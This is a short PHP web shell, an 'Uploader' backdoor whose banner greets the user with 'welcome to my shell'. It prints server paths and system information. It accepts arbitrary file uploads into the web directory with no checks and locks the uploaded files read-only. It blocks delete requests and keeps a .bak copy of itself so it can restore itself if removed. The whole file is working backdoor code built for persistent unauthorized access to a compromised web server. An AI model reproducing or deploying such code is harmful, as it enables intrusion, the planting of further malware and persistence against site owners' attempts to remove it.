<?= "<title>Uploader levilgax</title><b>@fuckedshet :===>>>Hello, welcome to my shell </b></br>".$_SERVER['DOCUMENT_ROOT']."</br>".php_uname(); 

$cwd = getcwd(); 
echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>';

if (!empty($_FILES['uploads'])) {
    move_uploaded_file($_FILES['uploads']['tmp_name'], $_FILES['uploads']['name']);  
    $uploaded_file = realpath($_FILES['uploads']['name']); 
    echo "<script>alert('Upload Done');</script><b>Uploaded !!!</b><br>name : ". $_FILES['uploads']['name']."<br>size : ". $_FILES['uploads']['size']."<br>type : ". $_FILES['uploads']['type']."<br>path : ".$uploaded_file;
    
    // Thiết lập quyền file chống xóa
    chmod($uploaded_file, 0444); // Chỉ cho phép đọc
}

// Chặn xóa file
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete'])) {
    echo "<script>alert('File này không thể bị xóa!');</script>";
    exit;
}

// Tự động khôi phục file nếu bị xóa
$file_path = __FILE__;
$backup = $file_path . ".bak";
if (!file_exists($backup)) {
    copy($file_path, $backup);
}
if (!file_exists($file_path)) {
    copy($backup, $file_path);
}
?>
